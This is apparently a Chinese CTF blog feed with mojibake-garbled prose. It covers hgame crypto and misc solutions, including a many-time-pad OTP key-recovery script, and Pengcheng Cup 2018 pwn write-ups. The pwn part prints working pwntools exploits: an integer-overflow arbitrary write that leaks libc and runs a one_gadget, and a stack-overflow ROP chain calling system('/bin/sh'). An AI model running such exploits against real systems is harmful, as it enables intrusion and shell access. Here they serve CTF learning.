<h2 id="Try"><a href="#Try" class="headerlink" title="Try"></a>Try</h2><p>é¦–å…ˆåˆ†ææµé‡åŒ…ï¼Œä»é‡Œé¢æå–å‡ºä¸€ä¸ªå‹ç¼©åŒ… dec.zipï¼Œè§£å‹åæ˜¯å¦å¤–ä¸€ä¸ªå¸¦æœ‰å¯†ç çš„å‹ç¼©åŒ…å’Œ password.txtï¼Œæç¤ºå¯†ç æ˜¯ hgame åé¢è·Ÿç€ 8 ä¸ªä¸çŸ¥é“æ˜¯ä»€ä¹ˆçš„å­—ç¬¦ã€‚<br>çŒœæµ‹æ˜¯ 8 ä½æ•°å­—ï¼Œç”¨ ZIP å¯†ç ç ´è§£å·¥å…·çš„æ©ç æ¨¡å¼ç ´è§£å‡ºå¯†ç  hgame25839421<br>å‡ºæ¥ä¸€å¼ å›¾ç‰‡ï¼Œbinwalk è¿˜å¯ä»¥ä»å›¾ç‰‡æå–å‡ºæ¥å¦ä¸€ä¸ªå‹ç¼©åŒ…ï¼Œç›´æ¥è§£å‹éœ€è¦å¯†ç ï¼Œä½¿ç”¨ winrar ä¿®å¤å‹ç¼©åŒ…ä¹‹åå°±å¯ä»¥æ­£å¸¸è§£å‹äº†ï¼Œæœ€åå¾—åˆ°ä¸€ä¸ª word æ–‡æ¡£ï¼Œå°†åç¼€åæ”¹æˆ zip è§£å‹å‡ºæ¥ä¸€å †æ–‡ä»¶ï¼Œåœ¨ word æ–‡ä»¶å¤¹ä¸‹çš„ document.xml ä¸­æ‰¾åˆ° flagã€‚  </p>
<p>flag: hgame{59d28413e36019861498e823f3f41406}</p>
<h2 id="Mix"><a href="#Mix" class="headerlink" title="Mix"></a>Mix</h2><p>æ‘©æ–¯å¯†ç  â€“&gt; åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸² â€“&gt; æ …æ å¯†ç è§£å¯† â€“&gt; å‡¯æ’’å¯†ç è§£å¯†</p>
<p>flag: hgame{E4sY_cRypt0}</p>
<h2 id="perfect-secrecy"><a href="#perfect-secrecy" class="headerlink" title="perfect_secrecy!"></a>perfect_secrecy!</h2><p>æç¤º OTP å¯†ç ï¼Œå³ä¸€æ¬¡æ€§å¯†ç æœ¬ï¼Œé“¶è¡Œçš„ä¸€äº›åŠ¨æ€å£ä»¤ä½¿ç”¨çš„å°±æ˜¯ OTP åŠ å¯†ã€‚<br>ç»™å‡ºçš„è„šæœ¬å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">import binascii</span><br><span class="line">import string</span><br><span class="line">import random</span><br><span class="line"></span><br><span class="line">def strxor(a, b):</span><br><span class="line">    return &quot;&quot;.join(hex(x ^ y)[2:].zfill(2) for (x, y) in zip(a, b))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">fp = open(&#x27;poem.txt&#x27;, &#x27;rb&#x27;)</span><br><span class="line">flag = &quot;*********************************&quot;</span><br><span class="line">strings = fp.readlines()</span><br><span class="line">key = hex(random.randint(2**511, 2**512))[2:]    # ä» 2^511 åˆ° 2^512 å–éšæœºæ•°   OTP å¯†é’¥</span><br><span class="line">strs = [strxor(i[:-3], binascii.unhexlify(key)) for i in strings]</span><br><span class="line">result = strxor(flag.encode(&#x27;utf-8&#x27;), binascii.unhexlify(key))</span><br><span class="line">print(strs)</span><br><span class="line">print(result)</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">output:</span><br><span class="line">[&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;,</span><br><span class="line">&#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;,</span><br><span class="line">&#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;,</span><br><span class="line">&#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;,</span><br><span class="line">&#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;,</span><br><span class="line">&#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;,</span><br><span class="line">&#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;,</span><br><span class="line">&#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;,</span><br><span class="line">&#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;,</span><br><span class="line">&#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;,</span><br><span class="line">&#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;,</span><br><span class="line">&#x27;e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199&#x27;,</span><br><span class="line">&#x27;c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c&#x27;,</span><br><span class="line">&#x27;d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397&#x27;,</span><br><span class="line">&#x27;c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840&#x27;,</span><br><span class="line">&#x27;c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c&#x27;]</span><br><span class="line">&#x27;c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa&#x27;</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></div>
<p>å¤§æ¦‚æ„æ€å°±æ˜¯å£°æ˜äº†ä¸€ä¸ªéšæœºæ•°ä½œä¸º OTP çš„å¯†é’¥ï¼Œç”¨åŒä¸€ä¸ªå¯†é’¥å°†ä¸€é¦–è¯—å’Œ flag è¿›è¡ŒåŠ å¯†ã€‚<br>google ä¸€åœˆå‘ç°äº†å‡ é“ç±»ä¼¼çš„é¢˜ç›®ï¼ŒåŸºæœ¬æ€æƒ³æ˜¯ OTP è™½ç„¶å®‰å…¨ï¼Œä½†æ˜¯å¦‚æœä¸€ä¸ªå¯†é’¥è¢«ç”¨æ¥åŠ å¯†è®¸å¤šæ˜æ–‡çš„è¯ï¼Œå°±é¢ä¸´å¾ˆå¤§çš„é£é™©äº†ï¼Œæœ‰ä¸€ç§æ”»å‡»å«åš cribdragï¼Œå°±æ˜¯ä¸“é—¨ç”¨æ¥æ”»å‡» OTP ç±»ä¼¼çš„å¯†ç çš„ã€‚<br>åœ¨ github ä¸Šé¢å¯ä»¥æ‰¾åˆ° cribdragï¼Œä½†æ˜¯ç”¨åœ¨è¿™é“é¢˜ç›®ä¸Šå¹¶ä¸å¥½ä½¿ï¼Œæˆ‘æ‰¾åˆ°äº†å¦å¤–ä¸€ä¸ªè„šæœ¬</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">#!/usr/bin/python</span><br><span class="line">## OTP - Recovering the private key from a set of messages that were encrypted w/ the same private key (Many time pad attack) - crypto100-many_time_secret @ alexctf 2017</span><br><span class="line"># @author intrd - http://dann.com.br/ </span><br><span class="line"># Original code by jwomers: https://github.com/Jwomers/many-time-pad-attack/blob/master/attack.py)</span><br><span class="line"></span><br><span class="line">import string</span><br><span class="line">import collections</span><br><span class="line">import sets, sys</span><br><span class="line"></span><br><span class="line"># 11 unknown ciphertexts (in hex format), all encrpyted with the same key</span><br><span class="line">#ciphers = [c1, c2, c3, c4, c5, c6, c7, c8, c9, c10, c11]</span><br><span class="line">ciphers = [&#x27;daaa4b4e8c996dc786889cd63bc4df4d1e7dc6f3f0b7a0b61ad48811f6f7c9bfabd7083c53ba54&#x27;,</span><br><span class="line">           &#x27;c5a342468c8c7a88999a9dd623c0cc4b0f7c829acaf8f3ac13c78300b3b1c7a3ef8e193840bb&#x27;,</span><br><span class="line">           &#x27;dda342458c897a8285df879e3285ce511e7c8d9afff9b7ff15de8a16b394c7bdab920e7946a05e9941d8308e&#x27;,</span><br><span class="line">           &#x27;d9b05b4cd5ce7c8f938bd39e24d0df191d7694dfeaf8bfbb56e28900e1b8dff1bb985c2d5aa154&#x27;,</span><br><span class="line">           &#x27;d9aa4b00c88b7fc79d99d38223c08d54146b88d3f0f0f38c03df8d52f0bfc1bda3d7133712a55e9948c32c8a&#x27;,</span><br><span class="line">           &#x27;c4b60e46c9827cc79e9698936bd1c55c5b6e87c8f0febdb856fe8052e4bfc9a5efbe5c3f57ad4b9944de34&#x27;,</span><br><span class="line">           &#x27;d9aa5700da817f94d29e81936bc4c1555b7b94d5f5f2bdff37df8252ffbecfb9bbd7152a12bc4fc00ad7229090&#x27;,</span><br><span class="line">           &#x27;c4e24645cd9c28939a86d3982ac8c819086989d1fbf9f39e18d5c601fbb6dab4ef9e12795bbc549959d9229090&#x27;,</span><br><span class="line">           &#x27;d9aa4b598c80698a97df879e2ec08d5b1e7f89c8fbb7beba56f0c619fdb2c4bdef8313795fa149dc0ad4228f&#x27;,</span><br><span class="line">           &#x27;cce25d48d98a6c8280df909926c0de19143983c8befab6ff21d99f52e4b2daa5ef83143647e854d60ad5269c87&#x27;,</span><br><span class="line">           &#x27;d9aa4b598c85668885df9d993f85e419107783cdbee3bbba1391b11afcf7c3bfaa805c2d5aad42995ede2cdd82977244&#x27;,</span><br><span class="line">           &#x27;e1ad40478c82678995df809e2ac9c119323994cffbb7a7b713d4c626fcb888b5aa920c354be853d60ac5269199&#x27;,</span><br><span class="line">           &#x27;c4ac0e53c98d7a8286df84936bc8c84d5b50889aedfebfba18d28352daf7cfa3a6920a3c&#x27;,</span><br><span class="line">           &#x27;d9aa4f548c9a609ed297969739d18d5a146c8adebef1bcad11d49252c7bfd1f1bc87152b5bbc07dd4fd226948397&#x27;,</span><br><span class="line">           &#x27;c4a40e698c9d6088879397d626c0c84d5b6d8edffbb792b902d49452ffbec6b6ef8e193840&#x27;,</span><br><span class="line">           &#x27;c5ad5900df8667929e9bd3bf6bc2df5c1e6dc6cef6f2b6ff21d8921ab3a4c1bdaa991f3c12a949dd0ac5269c&#x27;]</span><br><span class="line"># The target ciphertext we want to crack</span><br><span class="line">target_cipher = &quot;c2967e7fc59d57899d8bac852ac3c866127fb9d7f1e5b68002d9871cccb8c6b2aa&quot;</span><br><span class="line"></span><br><span class="line"># XORs two string</span><br><span class="line">def strxor(a, b):     # xor two strings (trims the longer input)</span><br><span class="line">    return &quot;&quot;.join([chr(ord(x) ^ ord(y)) for (x, y) in zip(a, b)])</span><br><span class="line"></span><br><span class="line"># To store the final key</span><br><span class="line">final_key = [None]*150</span><br><span class="line"># To store the positions we know are broken</span><br><span class="line">known_key_positions = set()</span><br><span class="line"></span><br><span class="line"># For each ciphertext</span><br><span class="line">for current_index, ciphertext in enumerate(ciphers):</span><br><span class="line">	counter = collections.Counter()</span><br><span class="line">	# for each other ciphertext</span><br><span class="line">	for index, ciphertext2 in enumerate(ciphers):</span><br><span class="line">		if current_index != index: # don&#x27;t xor a ciphertext with itself</span><br><span class="line">			for indexOfChar, char in enumerate(strxor(ciphertext.decode(&#x27;hex&#x27;), ciphertext2.decode(&#x27;hex&#x27;))): # Xor the two ciphertexts</span><br><span class="line">				# If a character in the xored result is a alphanumeric character, it means there was probably a space character in one of the plaintexts (we don&#x27;t know which one)</span><br><span class="line">				if char in string.printable and char.isalpha(): counter[indexOfChar] += 1 # Increment the counter at this index</span><br><span class="line">	knownSpaceIndexes = []</span><br><span class="line"></span><br><span class="line">	# Loop through all positions where a space character was possible in the current_index cipher</span><br><span class="line">	for ind, val in counter.items():</span><br><span class="line">		# If a space was found at least 7 times at this index out of the 9 possible XORS, then the space character was likely from the current_index cipher!</span><br><span class="line">		if val &gt;= 7: knownSpaceIndexes.append(ind)</span><br><span class="line">	#print knownSpaceIndexes # Shows all the positions where we now know the key!</span><br><span class="line"></span><br><span class="line">	# Now Xor the current_index with spaces, and at the knownSpaceIndexes positions we get the key back!</span><br><span class="line">	xor_with_spaces = strxor(ciphertext.decode(&#x27;hex&#x27;),&#x27; &#x27;*150)</span><br><span class="line">	for index in knownSpaceIndexes:</span><br><span class="line">		# Store the key&#x27;s value at the correct position</span><br><span class="line">		final_key[index] = xor_with_spaces[index].encode(&#x27;hex&#x27;)</span><br><span class="line">		# Record that we known the key at this position</span><br><span class="line">		known_key_positions.add(index)</span><br><span class="line"></span><br><span class="line"># Construct a hex key from the currently known key, adding in &#x27;00&#x27; hex chars where we do not know (to make a complete hex string)</span><br><span class="line">final_key_hex = &#x27;&#x27;.join([val if val is not None else &#x27;00&#x27; for val in final_key])</span><br><span class="line"># Xor the currently known key with the target cipher</span><br><span class="line">output = strxor(target_cipher.decode(&#x27;hex&#x27;),final_key_hex.decode(&#x27;hex&#x27;))</span><br><span class="line"></span><br><span class="line">print &quot;Fix this sentence:&quot;</span><br><span class="line">print &#x27;&#x27;.join([char if index in known_key_positions else &#x27;*&#x27; for index, char in enumerate(output)])+&quot;\n&quot;</span><br><span class="line"></span><br><span class="line"># WAIT.. MANUAL STEP HERE </span><br><span class="line"># This output are printing a * if that character is not known yet</span><br><span class="line"># fix the missing characters like this: &quot;Let*M**k*ow if *o&#123;*a&quot; = &quot;cure, Let Me know if you a&quot;</span><br><span class="line"># if is too hard, change the target_cipher to another one and try again</span><br><span class="line"># and we have our key to fix the entire text!</span><br><span class="line"></span><br><span class="line">#sys.exit(0) #comment and continue if u got a good key</span><br><span class="line"></span><br><span class="line">target_plaintext = &quot;cure, Let Me know if you a&quot;</span><br><span class="line">print &quot;Fixed:&quot;</span><br><span class="line">print target_plaintext+&quot;\n&quot;</span><br><span class="line"></span><br><span class="line">key = strxor(target_cipher.decode(&#x27;hex&#x27;),target_plaintext)</span><br><span class="line"></span><br><span class="line">print &quot;Decrypted msg:&quot;</span><br><span class="line">for cipher in ciphers:</span><br><span class="line">	print strxor(cipher.decode(&#x27;hex&#x27;),key)</span><br><span class="line"></span><br><span class="line">print &quot;\nPrivate key recovered: &quot;+key+&quot;\n&quot;</span><br><span class="line"></span><br><span class="line">print &quot;hgame&#123;OTP_is_not_safe_if_more_than_once&#125;&quot;</span><br></pre></td></tr></table></figure></div>
<p>è„šæœ¬è§£å‡ºæ¥çš„ flag æ˜¯</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">*TP_:s_not_safe_if_more_tha&amp;_once</span><br></pre></td></tr></table></figure></div>
<p>æŠŠå‡ ä¸ªå­—ç¬¦ä¿®å¤ä¸€ä¸‹</p>
<p>flag: hgame{OTP_is_not_safe_if_more_than_once}</p>
<h2 id="Baseå…¨å®¶"><a href="#Baseå…¨å®¶" class="headerlink" title="Baseå…¨å®¶"></a>Baseå…¨å®¶</h2><p>ç»™å‡ºä¸€ä¸ªå¾ˆå¤§çš„æ–‡ä»¶ï¼Œé‡Œé¢æ˜¯å¾ˆå¤šå±‚ç¼–ç åµŒå¥—èµ·æ¥çš„ï¼Œæ¨èåˆ°<a class="link"   href="https://gchq.github.io/CyberChef/" >è¿™é‡Œ<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>è§£å¯†ã€‚  </p>
<p>flag: hgame{40ca78cde14458da697066eb4cc7daf6}</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
  </entry>
  <entry>
    <title>é¹ç¨‹æ¯ 2018 éƒ¨åˆ†é¢˜ç›®å¤ç°</title>
    <url>/2019/01/20/pcb2018-online/</url>
    <content><![CDATA[<p>è¿™æ˜¯ä¸€ä»½è¿Ÿæ¥çš„ wpï¼Œæœ€è¿‘ä¸€ç›´åœ¨å¿™è€ƒè¯•ä»€ä¹ˆçš„ï¼Œåªèƒ½æŠ½æ—¶é—´æ¥å¤ç°ä¸€ä¸‹é¢˜ç›®ã€‚é¦–å…ˆè¦åæ§½ä¸€ä¸‹ pcb çš„çº¿ä¸‹æ¯”èµ›ï¼Œè™½ç„¶æ˜¯ç¬¬ä¸€æ¬¡ä¸¾åŠï¼Œä½†æ˜¯å¹³å°ä¹Ÿè¦æµ‹è¯•å¥½å†ä¸Šï¼Œå¦åˆ™ä¼šå‡ºç°æ¯”èµ›ä¸€å¼€å§‹å¹³å°å°±å´©äº†çš„å°´å°¬æƒ…å†µ  ORZã€‚<br>ä¸è¿‡çº¿ä¸Šèµ›çš„é¢˜ç›®è´¨é‡è¿˜ä¸é”™ï¼Œå­¦åˆ°äº†ä¸€äº›ä¸œè¥¿ã€‚</p>
<span id="more"></span>

<h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="1-OverInt"><a href="#1-OverInt" class="headerlink" title="1. OverInt"></a>1. OverInt</h3><p>pwn çš„ç­¾åˆ°é¢˜ç›®ï¼Œæ¼æ´å¯ä»¥è¯´æ˜¯æ‘†åœ¨è„¸ä¸Šäº†(é¢˜ç›®åå­—ä¹Ÿæ˜¯æç¤º)ï¼Œä¸€å¤„ä»»æ„åœ°å€å†™ï¼š<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-1.png"
                      alt="image"
                ></p>
<p>ä¸è¿‡åœ¨ä¹‹å‰æœ‰ä¸¤æ­¥éªŒè¯éœ€è¦é€šè¿‡ï¼Œç¬¬ä¸€ä¸ªæ˜¯ç±»ä¼¼ hash çš„å‡½æ•°ï¼Œè¦æ±‚è¿”å›å€¼æ˜¯ 35ï¼Œç¬¬äºŒä¸ªæ˜¯æ±‚å’Œå‡½æ•°ï¼Œè¦æ±‚è¾“å…¥å››ä¸ªæ•°ï¼Œå¹¶ä¸”å®ƒä»¬çš„å’Œè¦ç­‰äº 0x20633372ï¼Œå¦å¤–ï¼Œ0x20633372 å’Œæœ€å¼€å§‹è¾“å…¥çš„æ•°ä¹‹å’Œè¦å°äºç­‰äº 4ã€‚<br>å­˜åœ¨ä¸€ä¸ªæ¼æ´ï¼Œé€šè¿‡æ•´æ•°æº¢å‡ºæ¥ç»•è¿‡éªŒè¯ã€‚  </p>
<p>ç¬¬ä¸€ä¸ªéªŒè¯å¯ä»¥çˆ†ç ´å‡ºæ¥ï¼Œç„¶åæ„é€ ä¸€ä¸ªæ•´æ•°æº¢å‡ºï¼Œè®©æœ€åçš„å’Œçš„äºŒè¿›åˆ¶æœ€é«˜ä½å˜æˆä¸€ï¼Œç”±äºæ˜¯ int å‹å˜é‡ï¼Œé‚£ä¹ˆè¿™ä¸ªæ•°å°±ä¼šè¢«è§†ä¸ºè´Ÿæ•°ä»è€Œç»•è¿‡éªŒè¯ã€‚<br>ç›´æ¥ä¸Šè„šæœ¬</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level=&quot;DEBUG&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">p = process(&quot;./overInt&quot;)</span><br><span class="line">#p = remote(&quot;58.20.46.148&quot;, 35272)</span><br><span class="line"></span><br><span class="line">def change(offset, content, flag = 0):</span><br><span class="line">    p.send(p32(offset))</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[0])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 1)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[1])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 2)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[2])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 3)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[3])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 4)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[4])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 5)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[5])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 6)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[6])</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(p32(offset + 7)) # offset</span><br><span class="line">    p.recv()</span><br><span class="line">    p.send(content[7])</span><br><span class="line">    if(flag == 1):</span><br><span class="line">        p.recv(19)</span><br><span class="line">        temp = u64(p.recv(6).ljust(8,&#x27;\x00&#x27;))</span><br><span class="line">        return temp</span><br><span class="line">    p.recv()</span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">k1 = chr(2) + chr(224) + chr(157) + chr(95)</span><br><span class="line">p.send(k1)</span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(5))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(&quot;\x6e\x33\x63\x20&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">pop_ret = 0x0000000000400b13</span><br><span class="line">puts_got = 0x602018</span><br><span class="line">p.send(p32(32))  # len</span><br><span class="line">p.recv()</span><br><span class="line">change(0x38, p64(pop_ret))</span><br><span class="line">change(0x40, p64(puts_got))</span><br><span class="line">change(0x48, p64(0x400550))</span><br><span class="line">puts_addr = change(0x50, p64(0x40087f), 1)</span><br><span class="line">log.info(&quot;puts_addr = 0x%x&quot; % puts_addr)</span><br><span class="line">libc_addr = puts_addr - libc.symbols[&quot;puts&quot;]</span><br><span class="line">log.success(&quot;libc_addr : 0x%x&quot; % libc_addr)</span><br><span class="line">one_gadget = libc_addr + 0x45216</span><br><span class="line"></span><br><span class="line">k1 = chr(2) + chr(224) + chr(157) + chr(95)</span><br><span class="line">p.send(k1)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(5))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(&quot;\x6e\x33\x63\x20&quot;)</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(1))</span><br><span class="line">p.recv()</span><br><span class="line">p.send(p32(8))</span><br><span class="line">p.recv()</span><br><span class="line">#gdb.attach(p)</span><br><span class="line">change(0x38, p64(one_gadget))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure></div>
<p>æ²¡æœ‰å¤ªå¤šéœ€è¦è§£é‡Šçš„ï¼Œå”¯ä¸€ä¸€ç‚¹å°±æ˜¯éœ€è¦æ³¨æ„ä»»æ„åœ°å€å†™æ¯æ¬¡åªèƒ½å†™ä¸€ä¸ªå­—èŠ‚ï¼Œè€Œä¸”æˆ‘ä»¬éœ€è¦åˆ©ç”¨è¿™ä¸ªæ¼æ´ä¸¤æ¬¡ï¼Œç¬¬ä¸€æ¬¡ç”¨æ¥æ³„éœ²åœ°å€ï¼Œç¬¬äºŒæ¬¡è§¦å‘æ¼æ´ã€‚</p>
<h3 id="2-code"><a href="#2-code" class="headerlink" title="2. code"></a>2. code</h3><p>å’Œä¸Šä¸€é“é¢˜ç±»ä¼¼ï¼Œéœ€è¦å…ˆè¿‡ä¸€ä¸ª hash éªŒè¯ï¼Œç„¶åå°±æ˜¯ä¸€ä¸ªæ ‡å‡†çš„æ ˆæº¢å‡ºï¼Œé€šè¿‡çˆ†ç ´ hash éªŒè¯ï¼Œçˆ†ç ´è„šæœ¬å¦‚ä¸‹</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">solver = &quot;wabcdefghijklmnopqrstuvxyzABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span><br><span class="line"></span><br><span class="line">it = 0</span><br><span class="line"></span><br><span class="line">for a in solver:</span><br><span class="line">    print(&quot;Solving... %d&quot; % it)</span><br><span class="line">    it += 1</span><br><span class="line">    for b in solver:</span><br><span class="line">        for c in solver:</span><br><span class="line">            for d in solver:</span><br><span class="line">                for e in solver:</span><br><span class="line">                    temp = a + b + c + d + e</span><br><span class="line">                    i = 0</span><br><span class="line">                    v4 = 0</span><br><span class="line">                    for i in range(5):</span><br><span class="line">                        v0 = 117 * v4 + ord(temp[i])</span><br><span class="line">                        v4 = v0 - 0x1D5E0C579E0 * (((((0x8B7978B2C52E2845 * v0) &gt;&gt; 64) + v0) &gt;&gt; 40) - (v0 &gt;&gt; 63)) </span><br><span class="line">                    if v4 == 22493966389:</span><br><span class="line">                        print(&quot;FOUND: %s&quot; % temp)</span><br><span class="line">                        exit()</span><br><span class="line"></span><br><span class="line"># wyBTs</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<p>æœ€åè§£å‡ºæ¥å¯†ç æ˜¯ wyBTs</p>
<p>æ¥ç€å°±å¯ä»¥é€šè¿‡ç»å…¸çš„æ ˆæº¢å‡ºæ¥æ‹¿ shell äº†ï¼Œéœ€è¦æ³¨æ„ä¸€ç‚¹ï¼Œç¨‹åºä¸­æœ‰ seccomp çš„ä¿æŠ¤ï¼Œç›´æ¥ä½¿ç”¨ one_gadget ä¸è¡Œï¼Œéœ€è¦ç”¨ system å‡½æ•°ã€‚</p>
<div class="code-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">context(log_level = &quot;DEBUG&quot;)</span><br><span class="line">libc = ELF(&quot;./libc-2.23.so&quot;)</span><br><span class="line">p = process(&quot;./code&quot;)</span><br><span class="line">p.recvuntil(&quot;name:\n&quot;)</span><br><span class="line">p.sendline(&quot;wyBTs&quot;)</span><br><span class="line">p.recvuntil(&quot;save\n&quot;)</span><br><span class="line">pop_rdi = 0x400983</span><br><span class="line">payload = &#x27;a&#x27; * 0x78 + p64(pop_rdi) + p64(0x601020) + p64(0x400570) + p64(0x400801)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.recv(13)</span><br><span class="line">strlen_addr = u64(p.recv(6).ljust(8,&quot;\x00&quot;))</span><br><span class="line">libc_addr = strlen_addr - libc.symbols[&quot;strlen&quot;]</span><br><span class="line">log.success(&quot;Libc address : 0x%x&quot; % libc_addr)</span><br><span class="line">system_addr = libc_addr + libc.symbols[&quot;system&quot;]</span><br><span class="line">binsh = libc_addr + 0x18cd57</span><br><span class="line">p.recvuntil(&quot;save\n&quot;)</span><br><span class="line">p.sendline(&quot;a&quot; * 0x78 + p64(pop_rdi) + p64(binsh) + p64(system_addr))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>


<h3 id="3-random-FSOP-æ”»å‡»"><a href="#3-random-FSOP-æ”»å‡»" class="headerlink" title="3. random  (FSOP æ”»å‡»)"></a>3. random  (FSOP æ”»å‡»)</h3><p>æœ¬é¢˜çš„è€ƒç‚¹æ˜¯ä¹‹å‰å­¦è¿‡çš„ IO_FILE çš„åˆ©ç”¨ï¼Œä¸è¿‡ä¹‹å‰çš„ä¾‹å­(HCTF 2018 the_end)æ˜¯ç›´æ¥ä¿®æ”¹äº† vtable ä¸­çš„å‡½æ•°æŒ‡é’ˆï¼Œä½†æ˜¯æœ¬é¢˜éœ€è¦æˆ‘ä»¬å…ˆå°† vtable è¿ç§»åˆ°å¯æ§çš„å†…å­˜ï¼Œç„¶åä¼ªé€ å‡½æ•°æŒ‡é’ˆï¼Œè¾¾åˆ°åˆ©ç”¨æ•ˆæœã€‚<br>å…ˆç”¨ IDA çœ‹ä¸€ä¸‹ç¨‹åºçš„ä»£ç <br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-2.png"
                      alt="image"
                ></p>
<p>é‡ç‚¹åœ¨å‡½æ•° sub_D20 ï¼Œæ³¨å†Œäº†ä¸‰ä¸ªè™šå‡½æ•°<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-3.png"
                      alt="image"
                ></p>
<p>ä¹Ÿå°±æ˜¯è¯´ï¼Œç›¸å½“äºæ„å»ºäº†ä¸€ä¸ªèœå•ï¼Œè¾“å…¥ 1 æ‰“å¼€ &#x2F;dev&#x2F;urandom æ–‡ä»¶<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-4.png"
                      alt="image"
                ></p>
<p>è¾“å…¥ 2 ä¼šè¿›å…¥åˆ°ä¸»è¦é€»è¾‘<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-5.png"
                      alt="image"
                ></p>
<p>è¾“å…¥ 3 å…³é—­è®¾å¤‡æ–‡ä»¶<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/image/pcb2018-6.png"
                      alt="image"
